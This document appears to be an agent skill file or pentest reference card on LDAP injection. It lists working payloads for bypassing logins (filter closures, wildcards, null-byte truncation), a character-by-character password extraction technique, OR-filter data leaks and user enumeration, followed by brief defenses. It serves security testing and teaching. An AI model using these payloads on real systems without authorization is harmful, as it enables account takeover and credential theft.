---
name: ldap-injection
description: >-
  LDAP injection. Use when login or directory search builds an LDAP filter from user input.
---

# LDAP Injection


### Mechanism

LDAP queries use a filter syntax. When user input is concatenated into filters without sanitization:

```
Original:  (&(uid=USER_INPUT)(password=PASS_INPUT))
Injection: (&(uid=admin)(|(password=*)(1=1)))(password=anything))
```

### Detection

```text
# Authentication bypass — classic:
Username: admin)(&)
Password: anything
# Filter becomes: (&(uid=admin)(&))(password=anything))
# The (&) always evaluates to TRUE

# OR injection:
Username: *)(uid=*))(|(uid=*
Password: anything
# Lists all users
```

### Common Filter Patterns

```text
# Search filter: (&(cn=INPUT)(objectClass=person))
# Auth filter:   (&(uid=INPUT)(userPassword=INPUT2))

# Metacharacters:
*   — wildcard (matches anything)
()  — grouping
&   — AND
|   — OR
!   — NOT
```

### Exploitation Scenarios

#### Authentication Bypass — Null Byte Truncation

```text
# When passwords are hashed (common in OpenLDAP):
Username: admin%00                 # URL-encoded null byte
# In Burp, change %2500 to %00 (actual null byte)
# LDAP query: (&(uid=admin\00)(userPassword=...))
# Null byte truncates the filter → password check skipped
```

#### Authentication Bypass — Wildcard and Logic

```text
# Simple wildcard:
Username: *
Password: *
# If filter: (&(uid=*)(userPassword=*)) → matches ALL entries

# Logic closure:
Username: zhang)(|(& 
Password: 1
# Filter becomes: (&(uid=zhang)(|(&)(userpassword=1))) → always TRUE
```

#### Authentication Bypass — Alternative Closures

```text
# Username: admin)(!(&(1=0))
# Password: anything
# Result: (&(uid=admin)(!(&(1=0)))(password=anything))
# The !(&(1=0)) = !(FALSE) = TRUE → bypasses password check
```

#### Data Extraction via Wildcard

```text
# Enumerate attributes character by character:
(&(uid=admin)(password=a*))  → invalid → password doesn't start with 'a'
(&(uid=admin)(password=b*))  → invalid
(&(uid=admin)(password=s*))  → valid! → password starts with 's'
(&(uid=admin)(password=se*)) → valid! → second char is 'e'
...
# Continue until full password is extracted
```

#### OR Filter Injection

When the application uses OR filters (e.g., search by department):

```text
# Original filter: (|(o=backend)(o=frontend))
# Injection in first parameter:
type1=backend)(cn=*&type2=frontend&pattern=1
# Result: (|(o=backend)(cn=*)(o=frontend))
# The (cn=*) matches ALL entries → data leak
```

#### User Enumeration

```text
(&(uid=*admin*)(objectClass=person))  → find all users containing "admin"
(&(uid=*)(mail=*@company.com))        → list all users with company email
```

### Defense

- Use parameterized LDAP queries (escape special chars: `*`, `(`, `)`, `\`, NUL)
- Input validation: reject `*()&|!=` in username/password fields
- Principle of least privilege for LDAP bind accounts

---
